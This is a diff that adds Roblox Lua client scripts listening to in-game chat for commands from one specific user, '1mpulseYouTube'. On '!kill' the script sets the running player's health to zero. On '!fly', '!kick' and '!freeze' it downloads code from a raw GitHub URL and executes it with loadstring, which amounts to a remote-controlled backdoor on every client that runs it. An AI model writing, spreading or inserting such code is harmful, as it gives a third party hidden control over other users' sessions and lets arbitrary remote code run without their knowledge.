@@ -1,0 +1,42 @@
+local RPL = game:GetService("ReplicatedStorage")
+local onMsgDefFil = RPL.DefaultChatSystemChatEvents.OnMessageDoneFiltering
+
+onMsgDefFil.OnClientEvent:Connect(function(msg)
+local message, sender = msg.Message, msg.FromSpeaker
+if sender == "1mpulseYouTube" and message == "!kill" then -- 
+print ("OMG "..sender.." SAID DEATH AND NOW WE KILL OURSELFS!?")
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end end)
+
+------------------------
+local RPL = game:GetService("ReplicatedStorage")
+local onMsgDefFil = RPL.DefaultChatSystemChatEvents.OnMessageDoneFiltering
+
+onMsgDefFil.OnClientEvent:Connect(function(msg)
+local message, sender = msg.Message, msg.FromSpeaker
+if sender == "1mpulseYouTube" and message == "!fly" then -- 
+print ("OMG "..sender.." SAID FLY SO WE TURN INTO GOD NOW??")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/flight'))()
+end end)
+
+------------------------
+local RPL = game:GetService("ReplicatedStorage")
+local onMsgDefFil = RPL.DefaultChatSystemChatEvents.OnMessageDoneFiltering
+
+onMsgDefFil.OnClientEvent:Connect(function(msg)
+local message, sender = msg.Message, msg.FromSpeaker
+if sender == "1mpulseYouTube" and message == "!kick" then -- 
+print ("OMG "..sender.." SAID KICK SO WE GET DISCONNECTED NOW??")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/kick'))()
+end end)
+
+------------------------
+local RPL = game:GetService("ReplicatedStorage")
+local onMsgDefFil = RPL.DefaultChatSystemChatEvents.OnMessageDoneFiltering
+
+onMsgDefFil.OnClientEvent:Connect(function(msg)
+local message, sender = msg.Message, msg.FromSpeaker
+if sender == "1mpulseYouTube" and message == "!freeze" then -- 
+print ("OMG "..sender.." SAID FREEZE SO WE GET DISCONNECTED NOW??")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/freeze'))()
+end end)
